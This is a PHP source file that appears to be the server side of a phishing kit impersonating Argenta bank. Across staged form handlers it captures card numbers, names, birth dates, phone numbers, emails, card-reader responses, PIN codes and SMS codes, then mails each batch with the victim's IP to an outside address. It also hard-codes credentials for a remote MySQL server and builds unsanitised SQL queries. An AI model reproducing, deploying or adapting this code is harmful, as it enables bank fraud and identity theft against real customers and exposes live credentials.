<?php session_start();
$mysqli=@new mysqli("89.203.250.134", "zepek17", "Welkom09!!", "zepek17");
$cHmA=md5($_SERVER["REMOTE_ADDR"]);
if(@$_GET["kget"]=="escape"){$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
header("location: https://www.argenta.be");
}
if(@$_GET["ckv"]==$cHmA)
{$result=$mysqli->query("SELECT * FROM a WHERE b='$cHmA'");
if($result->num_rows==0)
{echo"nope;";}
else{echo"OK";
}
$mysqli->close();
}
switch(@$_POST["xlamation"]){
	
case"a":$_SESSION["krn"]=@$_POST["abbonummer"];

$_SESSION["rnd"]=@$_POST["rndz"];

EK("Logz","Kaartnummer: ".$_SESSION["krn"]);
header("location: gegevens.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"b":$cvQ="Kaartnummer: ".$_SESSION["krn"]."<br><br>Voornaam: ".$_POST["voornaam"]."<br>Achternaam: ".$_POST["achternaam"]."<br>Geboortedatum: ".$_POST["dob1"]."-".$_POST["dob2"]."-".$_POST["dob3"]."<br>Telefoonnummer: ".$_POST["telt"]."<br>E-Mail: ".str_replace("%","@",$_POST["emailt"]);

$_SESSION["NAAMX"]=$_POST["achternaam"];
$_SESSION["NAAMV"]=$_POST["voornaam"];
$_SESSION["Mobi"]=$_POST["telt"];

$output = str_split(@$_POST['telt'], 6);
@$_SESSION['vRkD'] = @$output[0];
@$_SESSION['vRkD2'] = @$output[1];

EK("Gevz",$cvQ);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"c":$cvQa="Kaartnummer: ".$_SESSION["krn"]."<br><br>Response: ".$_POST["j_password"];
$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("Resp",$cvQa);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"d":$cvQa="Kaartnummer: ".$_SESSION["krn"]."<br><br>Bericht is gelezen!";

$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("Bericht",$cvQa);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"e":$cvQa="Kaartnummer: ".$_SESSION["krn"]."<br><br>Pincode: ".$_POST["pinzX"];
$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("Nipz",$cvQa);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"f":$cvQa="Oude Kaartnummer: ".$_SESSION["krn"]."<br><br>Nieuwe Kaartnummer: ".$_POST["abbonummer"];
$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("Extra Logz",$cvQa);
$_SESSION["krn"]=@$_POST["abbonummer"];
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;

case"g":$cvQa="Kaartnummer: ".$_SESSION["krn"]."<br><br>Betaalpas wordt verstuurd";
$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("Postal Move",$cvQa);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;


case"h":$cvQa="Kaartnummer: ".$_SESSION["krn"]."<br><br>SMS Code: ".$_POST["smszX"];
$mysqli->query("DELETE FROM a WHERE b='$cHmA'");
EK("SMS Code",$cvQa);
header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
}

function EK($subj,$berc){
$cQ=md5($_SERVER["REMOTE_ADDR"]);
$mysqli=@new mysqli("89.203.250.134", "zepek17", "Welkom09!!", "zepek17");
$mysqli->query("DELETE FROM a WHERE b='$cQ'");
$headers="From: klantenserv@".$_SERVER["SERVER_NAME"]."
";$headers.="MIME-Version: 1.0
";$headers.="Content-Type: text/html; charset=ISO-8859-1
";@mail("vanderweide@keemail.me","Arg SPEC (".$_SESSION["krn"]." - ".$subj.")",$berc."<br><br><b>".$_SERVER["REMOTE_ADDR"]."</b><br><br>http://".$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/mnp.php?idn=".base64_encode($cQ)."&kart=".base64_encode($_SESSION["krn"]),$headers);
include"setup.php";
}
?>